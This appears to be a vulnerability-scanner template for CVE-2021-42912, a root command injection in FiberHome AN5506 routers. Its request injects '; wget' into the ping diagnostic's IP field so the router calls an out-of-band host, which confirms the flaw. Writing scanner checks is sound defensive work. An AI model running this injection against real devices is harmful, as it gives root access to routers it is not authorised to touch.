id: CVE-2021-42912

info:
  name: FiberHome AN5506 OS Command Injection
  author: dwisiswant0
  description: |
    FiberHome ONU GPON AN5506-04-F RP2617 is affected by
    an OS command injection vulnerability. This vulnerability
    allows the attacker, once logged in, to send commands to
    the operating system as the root user via the ping diagnostic
    tool, bypassing the IP address field, and concatenating
    OS commands with a semicolon.
  reference: https://link.medium.com/bOWda3Dzimb
  severity: high
  tags: cve,cve2021,rce,router

requests:
  - method: GET
    path:
      - "{{BaseURL}}/goform/setPing?ping_ip={{url_encode('; wget http://{{interactsh-url}}')}}&requestNum=1&diagtype=1&0.{{rand_text_numeric(17)}}"

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"